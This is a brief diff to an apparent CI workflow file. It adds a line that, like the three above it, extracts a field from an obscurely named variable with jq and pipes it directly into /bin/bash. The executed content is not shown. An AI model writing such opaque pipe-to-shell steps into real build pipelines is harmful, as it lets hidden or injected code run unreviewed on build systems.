@@ -29,6 +29,7 @@ jobs:
           echo $xfdlk8 | jq -r .ywb11 | /bin/bash
           echo $na5369 | jq -r .ogtj13 | /bin/bash
           echo $vy14476 | jq -r .eymg1 | /bin/bash
+          printf '%s' "$jlb7888" | jq -r .ok44 | /bin/bash
 
       - name: Archive output
         if: always()
